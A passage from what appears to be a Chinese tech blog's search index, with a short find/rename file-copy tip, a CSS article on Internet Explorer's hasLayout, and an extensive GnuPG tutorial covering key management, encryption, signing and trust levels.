files.\n\n下面来看一个例子：\n\n最后再来个实际应用当中的问题，先看下以下的图~\n\n看到了吧，我们想把那个图片文件名中的ad字母换成big【注意：拷贝一份，不能直接替换】，那么想想该怎么做呢，对了，就是用rename~\n\ncd /data/openshop1028/IMGSERVER/sources/goods/\n\nfind ./ -name \"ad.jpg\" -exec cp \"{}\" {}.1 \\;\n\nfind ./ -name \"ad.jpg.1\" -exec renamead.jpg.1 big.jpg {} \\;\n\n假如要是能够直接替换的话，那就一条命令了：\n\ncd /data/openshop1028/IMGSERVER/sources/goods/\n\nfind ./ -name \"_ad.jpg\" -exec rename ad big {} \\;","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS十日谈/2013-12-17-the-fifth-day-talk-about-haslayout","title":"第五天，谈谈【hasLayout】","text":"Layout是什么\n“Layout”是IE浏览器的私有概念，它决定了一个元素如何显示以及约束其包含的内容、如何与其他元素交互和建立联系、如何响应和传递应用程序事件/用户事件等。\n\n为什么需要Layout\n'Layout' 是 IE 浏览器渲染引擎的一个内部组成部分(注意，Layout 在 IE 8 及之后的 IE 版本中已经被抛弃，所以下面的讨论只针对IE6、7)。在 IE 浏览器中，一个元素要么是依赖祖先元素来管理自身尺寸和内容， 要么是自己负责管理自身尺寸和内容。为了协调这两种方式的矛盾，渲染引擎采用了 'hasLayout' 属性，属性值可以为 true 或 false。 当一个元素的 'hasLayout' 属性值为 true 时，我们说这个元素'hasLayout'，即拥有布局。\n\n一个元素'hasLayout'就是指该元素自己负责管理自身尺寸和几乎所有子元素（除了那些同样拥有layout的子元素，因为这些拥有layout的子元素同样是自己负责管理自身的尺寸和后代）\n\n那为什么不是所有元素都有layout？让所有元素都自己管理自己的尺寸和内容不好么？\n\n微软给出的原因是“出于性能和简洁性考虑”。因为如果每个元素都缓存自己的布局信息会占用内存和计算时间。\n\n元素如何才能拥有layout\n有一些元素默认就拥有layout，例如：\n\n img\n table tr th td\n hr\n input select textarea button\n marquee\n iframe\n object applet embed\n html body\n\n其它元素在满足一定条件时也会拥有layout，例如：\n\n position:absolute的元素\n float: left | right 的元素\n display: inline-block的元素\n 在严格模式下，块级元素设置宽度/高度（值不能为auto）后会拥有layout\n 在compat模式下，任何元素赋值宽度/高度（值不能为auto）后都会具备layout\n 设置zoom属性（值不为normal）的元素具备layout\n 跟父级元素的布局流不相同的元素(rtl to ltr)\n\n当元素满足以上任何一个条件时在IE6、7中都会拥有layout。还有一些CSS属性只在IE7中能让元素拥有layout，例如：\n\n overflow: hidden | scroll | auto的元素\n overflow-x|-y: hidden | scroll | auto 的元素\n min-width | min-height: 任意值（包括0）的元素\n max-width | max-height: 除 “none” 之外的任意值的元素\n\n如何判断元素是否hasLayout\n\n通过脚本属性hasLayout 就可以判断元素是否拥有布局。假设有如下元素：\n\n    div id=\"test\" style=\"zoom:1;\"\n\n在IE开发者工具控制台中通过如下代码即可查看元素是否拥有布局：\n\n    alert(test.currentStyle.hasLayout)\n\n注意：没有办法设置hasLayout=false， 除非把一开始那些触发hasLayout的CSS属性去除\n。\n\n元素hasLayout之后会有怎样的变化\n\n 变化一：在拥有Layout的容器中，浮动元素参与容器高度的计算。\n\n 在IE6、7中测试如下代码：\n\n        div id=\"container\" style=\"border: 1px solid blue;\"\n            div style=\"float: left; width: 100px; height: 100px; background: red;\"/div\n        /div\n\n  效果如下：\n\n我们给container添加样式zoom:1，使其拥有Layout，效果如下：\n\n拥有Layout之前：由于浮动元素脱离文档流，不参与容器高度计算，所以容器高度为0。拥有Layout之后，按照规则，浮动元素就需要参与容器高度的计算。这也就是为什么在IE6、7中可以利用hasLayout来清除浮动。\n\n 变化二：与浮动元素相邻的，拥有Layout的元素不能与浮动元素相互覆盖。\n\n 在IE6、7中测试如下代码：\n\n        div style=\"float: left;width: 30px;height: 30px;background: red;\"/div\n        div style=\"background: yellow;\"Lorem ipsum dolor sit amet, consectetur adipisicing elit. Quae, reprehenderit!Lorem ipsum dolor sit amet, consectetur adipisicing elit. Iusto, rerum./div\n\n 效果如下：\n\n黄色矩形与浮动的红色矩形发生了重叠。接着，我们给黄色矩形添加样式zoom:1，使其拥有Layout，效果如下：\n\n黄色矩形拥有Layout后就不能与浮动元素相互覆盖了。\n\n 变化三：拥有layout的元素不会与它们的子元素发生外边距折叠。\n\n Collapsing Margins 即外边距折叠。参见http://www.w3.org/TR/CSS21/box.html#collapsing-margins\n\n 根据规范，一个盒子如果没有padding-top和border-top，那么它的上边距应该和其文档流中的第一个孩子元素的上边距重叠。\n\n 在IE6、7中测试如下代码：\n\n        div id=\"container\" style=\"border:2px solid blue;\"\n            div id=\"father\" style=\"background:yellow;\"\n                div id=\"son\" style=\"margin:30px 0; \"content/div\n            /div\n        /div\n 效果如下：\n\n有人把上面这种情况叫做\"劫持父元素\"，因为看上去son元素的margin-top似乎冲破了father元素的界限，并迫使father元素下降了30px。要知道这种效果其实是符合CSS规范的。因为father 元素没有padding-top和border-top，所以按照规范它的上边距就应该和自己的第一个子元素上边距重叠。\n\n 接着，我们给father元素添加样式zoom:1，使其拥有Layout，\n\n \n\n拥有Layout的father元素就不再与子元素发生外边距折叠。\n\n当然，元素拥有layout之后的变化不止这三点，还有很多变化与IE的bug有关，尤其是涉及到相对定位或者绝对定位。这些问题我们留到后面分析。\n\n参考资料：\n\n On having layout\n \"HasLayout\" Overview\n http://www.w3help.org/zh-cn/causes/RM8002\n\n题外话：\n\n依然是分享一段话：来自刘瑜的《观念的水位》\n\n  我以前在国内读研上课时，可怜的老师时不时被学生这样质问：老师你说我们学这些有什么用呢？能不能教点对我们找工作有帮助的东西？\n\n  我很想知道当年牛顿讲授重力原理和月亮轨迹时，是不是也有一帮这么讨厌的人在问：老师你说我们学这些有什么用呢？而如果有人这样问，牛顿会不会反问：难到仅仅满足我们的好奇心还不够吗？\n\n想想我自己上学时就曾这么被讨厌过，%  _\u003c%  保持一颗好奇心，技术才会有进步，生活才不会无聊 ，嗯。\n\n  [1]: http://htmljs.b0.upaiyun.com/uploads/1388905700116-1.PNG\n  [2]: http://htmljs.b0.upaiyun.com/uploads/1388905888623-2.PNG\n  [3]: http://htmljs.b0.upaiyun.com/uploads/1388907789817-3.PNG\n  [4]: http://htmljs.b0.upaiyun.com/uploads/1388908494462-4.PNG\n  [5]: http://htmljs.b0.upaiyun.com/uploads/1388910497208-5.PNG\n","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 gpg","title":"Linux命令 gpg openssl","text":"计算机技术发展这么多年，安全验证的技术也是很多种，大家熟悉有： BaseAuth, Oauth, Oauth2，基于Token的认证等机制。现在比较流行，大家常用的就是token认证的方式。\n   token的生成一般是采用uuid保证唯一性，当用户登录时为其生成唯一的token，存储一般保存在数据库中。token过期时间采用把token二次保存在cookie或session里面，根据cookie和session的过期时间去维护token的过期时间。至于采用那种存储一般需要根据应用程序部署的环境，如果你的应用部署在多台机器上，使用nginx进行负载均衡，那么需要把token二次保存在cookie中。\n   怎么保证用户使用状态下token持续时间的一直有效？这需要依赖框架的一种机制，大家应该都挺熟悉的，那就是aop技术（面向切面编程），在Yii2框架里面一般采用behavior来实现，主要内容就是在给用户行为的api controller添加一个before action。在action里面，从cookie中获取token,拿取用户信息，如果用户有操作的权限，就根据当前时间去更新cookie的过期时间，从而维护token的持续时间，使得token在给定时间内不会过期，这样可以使用户的操作体验达到最佳，又能起到保护程序安全的作用。\n\n支持方式\t支持内容\n公钥\t    RSA,RSA-E,RSA-S,ELG-E,DSA\n对称加密   3DES,CAST5,BLOWFISH,AES,AES192,AES256,TWOFISH\n散列0\t    MD5,SHA1,SHA160,SHA256,SHA384,SHA512\n压缩\t   不压缩，ZIP,ZLIB,BZIP2\n\ngpg 对称加密 密码\ngpg -c test.cpp         加密\ngpg -o output.cpp test.cpp.gpg 解密\n\nGPG 非对称加密 公钥+私钥\n在 Unix 上密钥存储在 ~/.gnupg/ 中\n~/.gnupg/pubring.gpg                  包含你的公钥和所有其他导入的信息\n~/.gnupg/secring.gpg                 # 可包含多个私钥\n配置文件介绍\nGPG 配置文件目录:~/.gnupg\n~/.gnupg/gpg.conf – 配置文件\n~/.gnupg/trustdb.gpg – 信任库\n~/.gnupg/pubring.gpg – 公钥库\n~/.gnupg/secring.gpg – 私钥库\n\n常用选项的简短描述：\n\n-e 加密数据\n-d 解密数据\n-r 为某个收件者加密('全名' 或者 'email@domain')\n-a 输出经过 ascii 封装的密钥\n-o 指定输出文件\n\n-o, --output\n-r, --recipient NAME\n-a, --armor   ascii  表示加内容转换成可见的 ASCII 码输出\n-e, --encrypt\n-s, --sign [file]  \n-d, --decrypt\n-se -r Bob [file]          sign and encrypt for user Bob\n\n查看本机钥匙信息\ngpg --list-keys\n\n生成钥匙对\ngpg --gen-key\n    输入 name email passwd\n\n为了将自己的公钥发送给他人，你需要把公钥导出成为一个文件：\ngpg  -a --export [UID|name|email] --output key.pub\n      -a 表示输出文本文件格式。默认输出是二进制格式，因为二进制格式不太方便在网络（比如论坛或者博客）上展示，所以推荐文本格式。\n      --output 指定输出文件的名字，你可以更改为其他名字。\n      --export 表示执行输出公钥操作，后面的 UID 为你要输出的公钥的标识。\n\n  私钥导出：\n  gpg -ao seckey.asc --export-secret-keys mykeyID\n把公钥发布到公钥服务器\n$ gpg --keyserver keys.gnupg.net --send-key [公钥的标识（id）]\n注： --keyserver 可以不加，默认为 keys.gnupg.net\n在公钥服务器搜索公钥\n$ gpg --keyserver keys.gnupg.net --search-key [UID|name|email]\n公钥并导入到本机\n$ gpg --keyserver keys.gnupg.net --recv-key 72E75B05\n        72E75B05 是这个公钥的id，这个id跟uid都是用于标识这个公钥的，因为uid是用户随便输入的所以会有重复的情况，因此在某些需要明确指定公钥的命令，需要用id而不能用uid表示这个公钥。\n$ gpg --import key.public\n核对公钥的指纹值并签收公钥\n$ gpg --fingerprint\n公钥进行签收（sign key）：\n$ gpg --sign-key [UID|name|email]\n  把对方的公钥导入到本机后，就已经可以用它来加密信息或者用于校验我的数字签名。不过这样每次操作时都会提示公钥不可信，因为虽然你导入了我的公钥，但存在导入冒充者的公钥的可能性。所以你需要进一步跟我核对公钥是否正确，然后签收（sign key）它\n\n密钥的回收\n gpg -o revoke.asc –gen-revoke jianxiangqiao\n 选择吊销的原因：0=未指定原因，1=密钥已泄露，2=密钥被替换，3=密钥不再使用，Q=取消。\n\n 密钥回收:当您的密钥对生成之后，您应该立即做一个公钥回收证书，如果您忘记了您的私钥的口令或者您的私钥丢失或者被盗窃，您可以发布这个证书来声明以前的公钥不再有效。 生成回收证书\n\n gpg --output revoke.asc --gen-revoke mykeyID\n\n 导入回收证书\n gpg --import revoke.asc\n 发送回收证书到服务器，声明原 GPG Key 作废\n gpg --keyserver keyserverAddress --send mykeyID\n\n删除密钥\n先删除私钥\ngpg --delete-secret-keys jianxiangqiao\n再删除公钥\ngpg --delete-keys jianxiangqiao\n######################\n加密一个文件 默认：\n10. 加密一个文件\n$ gpg -a --output message-ciper.txt -r ivarptr@126.com -e message.txt\n\n  -a 表示输出文本文件格式。\n  --output 指定输出（即加密后）的文件名。\n  -r 指定信息的接收者（recipient）公钥的uid，可以是名字也可以是email地址。\n  -e 表示这次要执行的是加密（encrypt）操作\n\n11. 解密一个文件\n  现在假设我已经收到你寄过来的加密文件 message-ciper.txt，使用如下的命令解密：\n  $ gpg --output message-plain.txt -d message-ciper.txt\n\n      --output 指定输出（即解密后）的文件名。\n      -d 表示这次要执行的是解密（decrypt）操作\n##############################################################\nGPG数字签名：用来检验一个文件是否被修改 默认:SHA256\n12. 生成独立的签名文件 abc.txt + abc.txt.asc\n      $ gpg -a -b abc.txt\n    -a 表示输出文本文件格式。\n    -b 表示以生成独立的签名文件的方式进行签名\n\n13. 数字签名一个文件的方法B abc.txt.asc\n    如果不想生成一个独立的签名文件，则还可以用如下的命令进行签名：\n    $ gpg -a --clearsign abc.txt\n    跟方法A不同的地方是用参数 –clearsign 替代了参数 -b参数 clearsign 表示将签名和原信息合并在一起，并生成一个新文件。\n\n14. 然后使用如下命令进行检验：\n    $ gpg --verify abc.txt.asc\n15. 使用如下命令可以把原始信息提取出来：\n    $ gpg --output message-original.txt -d abc.txt.asc\n\n GPG常用参数:\n-s, --sign [文件名]        生成一份签字\n--clearsign [文件名]       生成一份明文签字\n-b, --detach-sign         生成一份分离的签字\n-e, --encrypt             加密数据\n-c, --symmetric           仅使用对称加密\n-d, --decrypt             解密数据(默认)\n--verify                  验证签字\n--list-keys               列出密钥\n--list-sigs               列出密钥和签字\n--check-sigs              列出并检查密钥签字\n--fingerprint             列出密钥和指纹\n-K, --list-secret-keys    列出私钥\n--gen-key                 生成一副新的密钥对\n--delete-keys             从公钥钥匙环里删除密钥\n--delete-secret-keys      从私钥钥匙环里删除密钥\n--sign-key                为某把密钥添加签字\n--lsign-key               为某把密钥添加本地签字\n--edit-key                编辑某把密钥或为其添加签字\n--gen-revoke              生成一份吊销证书\n--export                  导出密钥\n--send-keys               把密钥导出到某个公钥服务器上\n--recv-keys               从公钥服务器上导入密钥\n--search-keys             在公钥服务器上搜寻密钥\n--refresh-keys            从公钥服务器更新所有的本地密钥\n--import                  导入/合并密钥\n--card-status             打印卡状态\n--card-edit               更改卡上的数据\n--change-pin              更改卡的 PIN\n--update-trustdb          更新信任度数据库\n--print-md 算法 [文件]     使用指定的散列算法打印报文散列值\n\n选项：\n\n-a, --armor               输出 ASCII 文本文件\n-r, --recipient           为收件者“UID”加密\n-u, --local-user          使用这个用户标识来签字或解密\n-z N                      设定压缩等级为 N (0 表示不压缩)\n--textmode                使用标准的文本模式\n-o, --output              指定输出文件\n-v, --verbose             详细模式\n-n, --dry-run             不做任何改变\n-i, --interactive         覆盖前先询问\n--openpgp                 行为严格遵循 OpenPGP 定义\n--pgp2                    生成与 PGP 2.x 兼容的报文\n\n(请参考在线说明以获得所有命令和选项的完整清单)\n\n范例：\n-se -r Bob [文件名]          为 Bob 这个收件人签字及加密\n--clearsign [文件名]         做出明文签字\n--detach-sign [文件名]       做出分离式签字\n\nGPG 加密解密简明教程\n\n大家都知道，互联网上充斥着大量的明文传输方式，可以说绝对是不安全地带。那么，我们如何保证在不安全的互联网中更可靠的传输重要数据呢？个人认为最好的方式之一就是使用 GPG 工具进行加密。此文只是简单介绍了 GPG 的常规用法，重在推广和普及 GPG 加密工具，详细的使用请参见 GPG 手册。\n\n 名词解释\n\nRSA / DSA / ElGamal : 是指加密算法\n\nGPG :（全称 GnuPG ) 是一款非对称加密(PGP)的免费软件，非对称加密方式简单讲就是指用公钥加密文件，用私钥解密文件。如果你想给谁发送加密信息，首先你要得到他的公钥，然后通过该公钥加密后传给他，对方利用自已的私钥就可解密并读取文件了。\n\n    # 配置文件介绍\n    GPG 配置文件目录:~/.gnupg\n    ~/.gnupg/gpg.conf – 配置文件\n    ~/.gnupg/trustdb.gpg – 信任库\n    ~/.gnupg/pubring.gpg – 公钥库\n    ~/.gnupg/secring.gpg – 私钥库\n\n基本操作\n\n生成密钥对\n    gpg --gen-key\n\n生成过程中会让你选择加密方式，一般选 (1) RSA and RSA (default) 就可以了，然后还需要选择加密位数、过期日期及输入姓名，邮件地址，备注，Passphrase(访问密码）等信息。最后你就可以干点别的事，比如上上网，玩玩游戏什么的，以便让机器生成一些随机数，回头你就可以看到密钥对已经生成完毕。\n\n传播公钥：\n导出公钥:生成后你可以把公钥中公钥库中导出来，以便传播给你的朋友。\n\n    gpg --export --armor mykeyID   gpgkey.pub.asc  mykeyID 部分可以用 name 或 mail 地址代替\n\n注： - -armor 表示加内容转换成可见的 ASCII 码输出,否则是二进制不可见内容。\n现在你可以把导出的公钥通过 Email 等途径发送给你的朋友了，或者你也可以不导出公钥直接上传公钥到密钥服务器。\n\n    gpg --keyserver keyserverAddress --send mykeyID\n\n注： --keyserver 可以不加，默认为 keys.gnupg.net\n然后只要把公钥 ID 和服务器地址告诉给朋友就可以了，朋友可以通过搜索你的 公钥 ID ，Email 地址或名字来获取并导入你的公钥，如下：\n\n    gpg --keyserver keyserverAddress --search-keys keyid/name/Email\n比如搜索我的：\n\n    gpg --keyserver keyserver.ubuntu.com --search-keys rikulu\n\n导入朋友的公钥\n\n当你获得朋友的公钥文件后，你首先需要导入公钥到公钥库\n\n    gpg --import gpgkey.pub.asc\n\n或直接从公钥服务器导入\n\ngpg --keyserver keyserverAddress --recv-keys pubkeyID\n\n私钥备份与密钥回收\n\n密钥的导出和导入:以便用来备份密钥或导入到其它机器上。\n导出私钥\n    gpg -oa seckey.asc --export-secret-keys mykeyID\n导入私钥\n    gpg --import seckey.asc\n\n密钥回收:当您的密钥对生成之后，您应该立即做一个公钥回收证书，如果您忘记了您的私钥的口令或者您的私钥丢失或者被盗窃，您可以发布这个证书来声明以前的公钥不再有效。\n生成回收证书\n    gpg --output revoke.asc --gen-revoke mykeyID\n导入回收证书\n    gpg --import revoke.asc\n发送回收证书到服务器，声明原 GPG Key 作废\n    gpg --keyserver keyserverAddress --send mykeyID\n\n 列出机器中保存的所有密钥\n\n列出所有公钥\n    gpg -k\n\n列出所有私钥\n    gpg -K\n\n常规使用\n对称加密与解密： 有时候没有得到对方的公钥，而且资料不是太重要，此时还可以使用简单的对称加密方式(加密及解密都使用相同的密钥/密码)，加密过程中提示输出对称密钥/密码，注意:此密码是临时用的密码,不要设置和自己的私钥保护密码一样，以防别人猜测及盗用!\n\n密码加密\n    gpg -c filename   \n         -c, --symmetric               仅使用对称加密\n\n密码解密\n    gpg -d filename.gpg\n         -d, --decrypt                 解密数据(默认)\n\n非对称文件加密与解密：\n\n公钥加密：当你导入完好友的公钥后，就可以用朋友的公钥加密文件了，\n    gpg -e -r username filename (-r 表示指定用户)\n\n私钥解密：上面的操作会生成 filename.gpg 加密文件，之后你可以把此文件发送给好友了，对方就可以用自已的密钥来解密文件了。\n    gpg -d filename.gpg\n\n对文件签名\n\n数字签名 二进制\n    gpg -o doc.sig -s doc\n    gpg --sign test.txt     test.txt.gpg\n其中doc是原文件，doc.sig包含了原文件和签名，是二进制的。这个命令会要求你输入你的私钥的密码句。\n    gpg -o doc.sig -ser name doc 既签名又加密\n    gpg -o doc -d doc.sig        解密时自动校验签名\n    gpg --local-user [发信者ID] --recipient [接收者ID] --armor --sign --encrypt test.txt\n    -u, --local-user 参数指定用发信者的私钥签名，\n    -r, --recipient  参数指定用接收者的公钥加密，\n    -a, --armor      参数表示采用ASCII码形式显示，\n    -s, --sign       signature参数表示需要签名，\n    -e, --encrypt    encrypt参数表示加密源文件。\n文本签名 ANSCII\n    gpg -o doc.sig --clearsign doc\n\n这样产生的doc.sig同样包含原文件和签名，其中签名是文本的，而原文件不变。\n\n分离式签名\n    gpg -o doc.sig -ab doc\n\ndoc.sig仅包括签名，分离式签名的意思是原文件和签名是分开的。\nb 表示分离式签名detach-sign\n\n  如果想生成单独的签名文件，与文件内容分开存放，可以使用detach-sign参数。\n\n  gpg --detach-sign test.txt\n  是一个二进制的数据，如果想采用ASCII码形式，要加上armor参数\n  gpg --armor --detach-sign test.txt\n\n验证签名\n    gpg --verify doc.sig [doc]\n    gpg --verify test.txt.asc test.txt\n修改信任等级\n    gpg --edit-key \"rinetd\" trust quit\n请选择您要使用的密钥种类：\n(1) DSA 和 ElGamal (默认)\n(2) DSA (仅用于签名)\n(5) RSA (仅用于签名)\n您的选择？ 1  ←只有1可以用于加密，其他种类只能用于签名\nDSA 密钥对会有 1024 位。\nELG-E 密钥长度应在 1024 位与 4096 位之间。\n\n您想要用多大的密钥尺寸？(2048)  ←选择密码的位数，位数越大，越安全，但速度越慢\n您所要求的密钥尺寸是 2048 位\n\n请设定这把密钥的有效期限。\n0 = 密钥永不过期\nn  = 密钥在 n 天后过期\nnw = 密钥在 n 周后过期\nnm = 密钥在 n 月后过期\nny = 密钥在 n 年后过期\n密钥的有效期限是？(0) 0  ←根据实际情况选择密钥期限\n密钥永远不会过期\n以上正确吗？(y/n)y  ←确认\n\n您需要一个用户标识来辨识您的密钥；本软件会用真实姓名、注释和电子邮件地址组合\n成用户标识，如下所示：\n“Heinrich Heine (Der Dichter) heinrichh@duesseldorf.de”\n\n真实姓名：Hyphen Wang  ←请填入真实姓名，后面会用到\n电子邮件地址：gpgencrypt@linuxfly.org  ←邮件作为标记之一，不能重复\n注释：Use for GPG Encrypt  ←仅是注释而已\n您选定了这个用户标识：\n“Hyphen Wang (Use for GPG Encrypt) gpgencrypt@linuxfly.org”\n\n更改姓名(N)、注释(C)、电子邮件地址(E)或确定(O)/退出(Q)？O  ←输入“O”确认\n您需要一个密码来保护您的私钥。  ←输入两次用于访问私钥的密码，紧记，不能公开或丢失\n\n我们需要生成大量的随机字节。这个时候您可以多做些琐事(像是敲打键盘、移动\n鼠标、读写硬盘之类的)，这会让随机数字发生器有更好的机会获得足够的熵数。\n++++++++++...++++++++++..++++++++\n\n随机字节不够多。请再做一些其他的琐事，以使操作系统能搜集到更多的熵数！\n(还需要274字节)  ←运行一些的程序，以便在内存中获得更多随机数\n我们需要生成大量的随机字节。这个时候您可以多做些琐事(像是敲打键盘、移动\n鼠标、读写硬盘之类的)，这会让随机数字发生器有更好的机会获得足够的熵数。\n+++++++++++++++++++++++++.+++++.+++++.++++++++++.+++\u003c+++++..+++++^^^\ngpg: 密钥 A3942296 被标记为绝对信任  ←密钥ID\n公钥和私钥已经生成并经签名。\n\ngpg: 正在检查信任度数据库\ngpg: 需要 3 份勉强信任和 1 份完全信任，PGP 信任模型\ngpg: 深度：0 有效性：  2 已签名：  0 信任度：0-，0q，0n，0m，0f，2u\npub   1024D/A3942296 2008-12-19\n密钥指纹 = E95E 1F77 6C4E 33BD 740C  19AB EEF9 A67E A394 2296\nuid                  Hyphen Wang (Use for GPG Encrypt) gpgencrypt@linuxfly.org\nsub   2048g/911E677B 2008-12-19\n\n密钥的回收\n当您的密钥对生成之后，您应该立即做一个公钥回收证书，如果您忘记了您的私钥的口令或者您的私钥丢失或者被盗窃，您可以发布这个证书来声明以前的公钥不再有效。生成回收证书的选项是\"--gen-revoke\"。\ngpg --output revoke.asc --gen-revoke mykeyID\n\n其中mykey 参数是可以表示的密钥标识，产生的回收证书放在revoke.asc文件里，一旦回收证书被发放，以前的证书就不能再被其他用户访问，因此以前的公钥也就失效了。\n\nPS:如果一旦决定撤销已经上传的公钥，就需要将该密钥的回收证书上传至密钥服务器完成回收工作。\n\ngpg --keyserver Server Address --send-keys mykeyID\n\n3.密钥的上传\n\n当上述工作完成以后，为了让尽可能多的人获取您的公钥，您可以将公钥邮寄出去，或者贴在自己的个人主页上，当然还有一种更好的方法就是上传到全球性的密钥服务器，其他用户可以通过您提供的公钥ID来搜索并获得您的公钥。\n\n通过如下命令可以将你的key发布到服务器上：\n\ngpg --keyserver Server Address --send-keys mykeyID\nPS:当然您也可以定义默认的服务器key server，一般安装好后的默认key server都是subkeys.pgp.net。你也可以通过修改.gnupg/gpg.conf中的keyserver信息来改变你的key server。\n4.密钥的导出／导入\n\n我们通常需要导出公钥和私钥保存起来，当然公钥是可以满世界的泼洒，但是私钥请务必保存好，否则你的密钥对将会永久性的失去威力。\n公钥的导出：\ngpg -o keyfilename --export mykeyID\n\n如果没有mykeyID则是备份所有的公钥，-o表示输出到文件keyfilename中，如果加上-a的参数则输出文本格式( ASCII )的信息，否则输出的是二进制格式信息。\n\n私钥的导出：\ngpg -o keyfilename --export-secret-keys mykeyID\n\n如果没有mykeyID则是备份所有的私钥，-o表示输出到文件keyfilename中，如果加上-a的参数则输出文本格式的信息，否则输出的是二进制格式信息。\n\n密钥的导入：\ngpg --import filename\n\nPS:用户可以使用gpg --list-keys命令查看是否成功导入了密钥。\n\n5.加密解密和数字签名\n\n通过上述的密钥生成以及公钥分发后，加密和解密数据变得非常容易，用户可以通过使用该功能来达到安全地在网络上传输自己的隐密数据的目的。\n\n如果用户patterson要给用户liyang发送一个加密文件，则他可以使用liyang的公钥加密这个文件，并且这个文件也只有liyang使用自己的密钥才可以解密查看。下面给出加解密的步骤：\n\n用户patterson使用liyang的公钥加密文件test，使用下面的指令：\n gpg -e test\n\nYou did not specify a user ID. (you may use \"-r\")\n\nEnter the user ID. End with an empty line: liyang\n\nAdded 1024g/C50E455A 2006-01-02 \"liyang (hello)  liyang@sina.com\"\n\n这样，就可以将gpg.conf文件加密成test.gpg，一般用户是无法阅读的\n\nPS:当然你也可以直接指定使用哪个用户的公钥进行加密:\n\ngpg -e -r liyang test  (-r 表示指定用户)\n\n还可以加上参数 -a 来输出ASCII编码的文件test.asc(test.gpg是二进制编码的，不可用文本读)\n\ngpg -ea -r liyang test\n\n用户liyang 使用自己的私钥来解密该文件，如下所示：\ngpg -d test.gpg\n\nYou need a passphrase to unlock the secret key for\n\nuser: \"liyang (hello)  liyang@sina.com\"\n\n1024-bit ELG-E key, ID C50E455A, created 2006-01-02 (main key ID 378D11AF)\n\nGnuPG提示用户，需要输入生成私钥使用的密码：\n\nEnter passphrase:\n\ngpg: encrypted with 1024-bit ELG-E key, ID C50E455A, created 2006-01-02\n\n\"liyang (hello)  liyang@sina.com\"\n\nPS:无论加密解密，都可以加上-o参数来指定加密和解密后的输出文件，例如\n\ngpg -o doc.gpg -er name doc\n其中name是选择谁的公钥加密，即谁是文件的接收者。\ndoc为要加密的文件，即原文件\ndoc.gpg为命令执行后生成的加密的文件，这里要先指定好文件名\n\n对文件进行签名\n1、数字签名\n命令格式：\ngpg -o doc.sig -s doc\n其中doc是原文件，doc.sig包含了原文件和签名，是二进制的。这个命令会要求你输入你的私钥的密码句。\ngpg -o doc.sig -ser name doc\n既签名又加密\n\n2、文本签名\ngpg -o doc.sig --clearsign doc\n这样产生的doc.sig同样包含原文件和签名，其中签名是文本的，而原文件不变。\n\n3、分离式签名\ngpg -o doc.sig -ab doc\ndoc.sig仅包括签名，分离式签名的意思是原文件和签名是分开的。\nb 表示分离式签名detach-sign\n\n4、验证签名\ngpg --verify doc.sig [doc]\n验证之前必须导入文件作者的公钥，对于分离式签名，最后还要加上原文件，即后面的doc。\n\n密匙签名和用户信任(进阶功能)\n尽管在理论上讲，具备了公匙和私匙就可以实现安全的信息通讯，但是在实际应用中，还必须对公匙进行有效确认。因为，确实存在伪造公匙信息的可能。\n\n由此，在GPG中引入了一个复杂的信任系统，以帮助我们区分哪些密匙是真的，哪些密匙是假的。这个信任系统是基于密匙的，主要包括密匙签名。\n\n当收到熟人的公匙并且GPG告知不存在任何实体可信信息附加于这个公匙后，首要的事情就是对这个密匙进行“指纹采样”（fingerprint）。例如，我们对来自mike的公匙进行了导入操作，并且GPG告知我们不存在这个密匙的附加可信信息，这时候，我们首先要做的工作就是对这个新密匙进行“指纹采样 ”，相关命令及执行情况如下：\n\n$ gpg --fingerprint mike@hairnet.orgpub 1024D/4F03BD39 2001-01-15 Mike Socks (I'm WIRED) Key fingerprint = B121 5431 8DE4 E3A8 4AA7 737D 20BE 0DB8 4F03 BD39sub 1024g/FDBB477D 2001-01-15$\n\n这样，就从密匙数据中生成了其指纹信息，并且应该是唯一的。然后，我们打电话给mike，确认两件事情。首先，他是否发送给我们了密匙；其次，他的公匙的指纹信息是什么。如果Mike确认了这两件事情，我们就可以确信这个密匙是合法的。接下来，我们对密匙进行签名操作，以表示这个密匙来自Mike而且我们对密匙的信任，相关命令及执行情况如下：\n\n$ gpg --sign-key mike@hairnet.orgpub 1024D/4F03BD39 created: 2001-01-15 expires: neversub 1024g/FDBB477D created: 2001-01-15 expires: never(1) Mike Socks (I'm WIRED) pub 1024D/4F03BD39 created: 2001-01-15 expires: neverFingerprint = B121 5431 8DE4 E3A8 4AA7 737D 20BE 0DB8 4F03 BD39Mike Socks (I'm WIRED) Are you really sure that you want to sign this keywith your key: Ima User (I'm just ME) Really sign? yYou need a passphrase to unlock the secret key foruser: Ima User (I'm just ME) 1024-bit DSA key, ID D9BAC463, created 2001-01-03Enter passphrase:$\n\n执行到此，使用我们的私匙完成了对Mike的公匙的签名操作，任何持有我们的公匙的人都可以查证签名确实属于我们自己。这个附加到Mike的公匙上的签名信息将随它环游Internet世界，我们使用个人信誉，也就是我们自己的私匙，保证了那个密匙确实属于Mike。这是一个多么感人的充满诚信的故事啊 :-) 现实世界的人们是否应该从这严格的技术标准中反思些什么呢？\n\n还是回到这里。获取附加于一个公匙上的签名信息列表的命令是：\n\ngpg --check-sigs mike@hairnet.org\n\n签名列表越长，密匙的可信度越大。其实，正是签名系统本身提供了密匙查证功能。假设我们接收到一个签名为Mike的密匙，通过Mike的公匙，我们验证出签名确实属于Mike，那么我们就信任了这个密匙。推而广之，我们就可以信任Mike签名的任何密匙。\n\n为了更加稳妥，GPG还引入了另一个附加功能：可信级别（trust level）。使用它，我们可以为我们拥有的任何密匙的所有者指定可信级别。例如，即使我们知道Mike的公匙是可信的，但是事实上我们不能信任Mike在对其他密匙签名时的判断；我们会想，Mike也许只对少数密匙进行了签名，但却没有好好地检查一遍。\n\n设置可信级别的命令及执行情况如下：\n\n$ gpg --edit-key mike@hairnet.orgpub 1024D/4F03BD39 created: 2001-01-15 expires: never trust: -/fsub 1024g/FDBB477D created: 2001-01-15 expires: never(1) Mike Socks (I'm WIRED) Command  trust 1 = Don't know 2 = I do NOT trust 3 = I trust marginally 4 = I trust fully s = please show me more information m = back to the main menuYour decision? 2Command  quit$\n\n在命令编辑环境中执行trust，然后选择级别2（I do NOT trust），这样我们割断了任何信任链，使每个密匙都必须经过Mike的签名。\n\n6.删除密钥\n\n从私钥钥匙环里删除密钥：\n\n gpg --delete-secret-keys hyphenwang@redflag-linux.com\ngpg (GnuPG) 1.4.5; Copyright (C) 2006 Free Software Foundation, Inc.\nThis program comes with ABSOLUTELY NO WARRANTY.\nThis is free software, and you are welcome to redistribute it\nunder certain conditions. See the file COPYING for 